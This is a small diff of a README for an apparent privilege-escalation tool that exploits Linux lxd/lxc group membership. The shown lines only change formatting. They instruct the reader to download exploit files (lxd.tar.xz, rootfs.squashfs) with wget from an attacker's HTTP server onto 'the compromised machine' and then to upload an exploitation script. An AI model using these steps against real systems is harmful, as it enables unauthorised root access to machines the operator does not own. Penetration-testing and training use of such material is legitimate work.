@@ -41,8 +41,8 @@ lxc Privilage Escalation Is An Automation Tool To Exploit The Linux xlc Group Mi
 
 - Upload The Files Which Will Be The Exploit For Us In The Compromised Machine By Doing:
 
- `wget http://[Your IP]:8000/lxd.tar.xz` <br>[-] For Example: `wget http://192.168.1.5:8000/lxd.tar.xz`<br><br><br>
- `wget http://[Your IP]:8000/rootfs.squashfs` <br>[-] For Example: `wget http://192.168.1.5:8000/rootfs.squashfs`<br><br><br>
+ `wget http://[Your IP]:8000/lxd.tar.xz` <br><br>[-] For Example: `wget http://192.168.1.5:8000/lxd.tar.xz`<br><br><br>
+ `wget http://[Your IP]:8000/rootfs.squashfs` <br><br>[-] For Example: `wget http://192.168.1.5:8000/rootfs.squashfs`<br><br><br>
 
 - Then Upload The Exploitation Script:
 
